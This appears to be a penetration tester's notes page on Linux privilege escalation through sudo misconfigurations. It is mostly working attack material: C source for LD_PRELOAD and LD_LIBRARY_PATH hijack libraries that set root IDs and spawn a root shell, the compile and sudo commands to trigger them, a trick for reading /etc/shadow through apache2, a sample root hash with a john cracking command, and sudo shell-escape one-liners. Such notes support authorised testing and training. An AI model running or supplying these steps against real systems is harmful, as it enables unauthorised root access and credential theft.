---
title: Sudo
parent: Method (Linux)
layout: default
nav_order: 2
---

## Environmental Variables
#### LD_PRELOAD
1. Use `sudo -l` to check if there is an `env_keep` option for `LD_PRELOAD`
2. Create a file (preload.c) with the file content below.
3. Compile preload.c to preload.so:\
   `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`
4. Run any allowed program using `sudo`, and set LD_PRELOAD to the compiled preload.so:\
   `sudo LD_PRELOAD=/tmp/preload.so apache2`

preload.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
​
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

#### LD_LIBRARY_PATH
1. Use `sudo -l` to check if there is an `env_keep` option for `LD_LIBRARY_PATH`
2. Run `ldd` against those suspicious app, eg apache2:\
   `ldd /usr/sbin/apache2`
3. Randomly choose 1 of the library used (trial and error) for eg if we choose libcrypt.so.1
4. Create a file as below (library_path.c)
5. Compile the file into libcrypt.so.1:\
   `gcc -o libcrypt.so.1 -shared -fPIC library_path.c`
6. Run apache2 using `sudo` while setting LD_LIBRARY_PATH to the current directory (`.`) where we compiled the file: `sudo LD_LIBRARY_PATH=. apache2`

library_path.c
```
#include <stdio.h>
#include <stdlib.h>
​
static void hijack() __attribute__((constructor));
​
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

## Shell Escape Sequence
1. List allowed to run via `sudo -l`.
2. Check for shell escape sequence at https://gtfobins.github.io/
3. Perform the sequence listed

## Abusing Intended Functionality
1. Some don't have escape sequence but somehow can abuse their function.
2. For example if run `sudo -l` and see apache2.
3. By providing apache2 with a config file:
   `sudo apache2 -f /etc/shadow`
   will throw you the full line 1 which is usually root.
4. Save the hash:\
   `echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt`
5. Crack using john:\
   `john --format=sha512crypt --wordlist=/usr/share/seclists/rockyou.txt hash.txt`
6. `su` then type in cracked password.

## ALL:ALL as another user
1. Use `sudo -u anotheruser bash -i`, then you have access as that user.

## Known Low Privilege Password
1. Type `sudo su` and enter the current user password.
2. If allowed will gain root access.
3. If `su` not allowed can try the following:
   `sudo -s`
   `sudo -i`
   `sudo /bin/bash`
   `sudo passwd`